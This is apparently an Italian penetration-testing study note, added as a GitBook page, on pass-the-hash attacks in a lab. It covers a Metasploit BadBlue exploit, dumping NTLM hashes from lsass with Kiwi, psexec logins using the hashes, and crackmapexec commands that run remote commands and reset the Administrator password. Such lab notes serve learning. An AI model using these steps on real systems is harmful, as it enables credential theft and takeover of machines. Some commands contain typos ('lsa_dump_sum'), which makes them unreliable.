@@ -1,0 +1,124 @@
+---
+description: Pass-the-Hash attacks
+---
+
+# Pass-the-Hash Attacks
+
+<figure><img src="../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>
+
+Se abbiamo degli hash possiamo fare dei pass-the-hash attacks.
+
+Possiamo passare l'hash al target e autenticarci legittimamente via SMB.
+
+Utile se siamo entrati nel sistema da un servizio che però ha l'utente blindato, se riusciamo a ricavare gli hash possiamo poi entrare come utenti admin o privilegiati via SMB e quindi rendere più persistente la nostra presenza nel sistema target.
+
+## Exploit di BadBlue
+
+```
+service postgresql start
+msfconsole
+search badblue
+use exploit/windows/http/badblue_passthru
+set RHOSTS 10.2.28.132
+exploit
+```
+
+<figure><img src="../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>
+
+## Dump degli hash NTLM con Kiwi
+
+Ora otterremo una meterpreter session e a questo punto cerchiamo il processo lssass e migramio al process id di lsass in questo modo abbiamo come privilegi NT AUTHORITY\SYSTEM, e a questo punto carichiamo kiwi e poi eseguiamo lsa\_dump\_sam per fare il dump delle credenziali e hash presenti nel sistema, in particolare l'hash NTLM dell'utente Administrator.
+
+```
+pgrep lsass //ci restituisce 780 che è l'id del processo
+migrate 780 // l'id del processo di lsass
+getuid
+load kiwi
+lsa_dump_sum
+hashdump
+```
+
+<figure><img src="../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>
+
+Salviamo l'hash NTLM di Administrator in un nuovo file txt assieme a quante altre credenziali vogliamo (es: student).
+
+Avremmo ottenuto lo stesso risultato degli hash NTLM con mimikatz
+
+<figure><img src="../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>
+
+## Effettuare un pass the hash usando il modulo MSF psexec
+
+Per usare questo modulo abbiamo bisogno anche del LM hash oltre l'hash NTLM. Per trovarlo abbiamo bisogno di usare il comando hashdump, l'LM hash è lo stesso per ogni utente.
+
+Prendiamo quindi l'LM + NTLM come selezionato qui sotto, e lo incolliamo sempre nel nostro file txt.
+
+<figure><img src="../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>
+
+Mettiamo in background la sessione meterpreter (CTRL+Z) e cerchiamo il modulo psexec che ci serve (Authenticated User Code execution, per questo ci servono le credenziali o meglio l'hash).
+
+```
+search psexec
+use exploit/windows/smb/psexec // lasciamo il payload di default, eventualmente potremmo cambiarlo con il 64 bit meterpreter module se vogliamo
+show options
+set LPORT 4422 // cambiamo quella di default perché sulla 4444 abbiamo già l'altra sessione attiva in background
+set RHOSTS <target IP>
+set SMBUser Administrator  //se parte di un dominio dobbiamo settare anche SMBDomain
+set SMBPass LM_Hash:NTLM_Hash //quelli copiati prima
+set target Native\ upload
+exploit
+```
+
+<figure><img src="../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>
+
+L'exploit ha fallito perché non abbiamo impostato un target, e impostiamo in questo caso il target Command
+
+<figure><img src="../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>
+
+Ancora non otteniamo una sessione, ma probabilmente dobbiamo configurare un target, proviamo con una Native\ upload per fare l'upload del meterpreter payload.
+
+<figure><img src="../../.gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>
+
+Come possiamo vedere ha fatto l'autenticazione con l'utente Administrator, ha caricato il payload ed ha aperto la sessione. Effettivamente la sessione è stata aperta come administrator (NT AUTHORITY\SYSTEM) e tutto questo lo abbiamo fatto con un hash trovato relativamente facilmente.
+
+
+
+Ora riproviamo in un altro modo, killiamo tutte le sessioni con
+
+```
+sessions -K
+```
+
+Ora non abbiamo accessi sul sistema target ma abbiamo solo come info SMBUser e l'hash delle password, e se premiamo exploit ancora funziona.
+
+### Programmi e tool alternativi
+
+Potremmo usare anche i seguenti programmi: psexec o psexec python script o crackmap.
+
+## Crackmap
+
+```
+crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM Hash> //non è necessario mettere l'LM hash qui
+crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM Hash> -x "ipconfig"
+crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM Hash> -x "whoami"
+crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM Hash> -x "net user administrator password123" //per cambiare la password di administrator
+crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM Hash> -x "net user" //per elencare gli utenti
+```
+
+<figure><img src="../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>
+
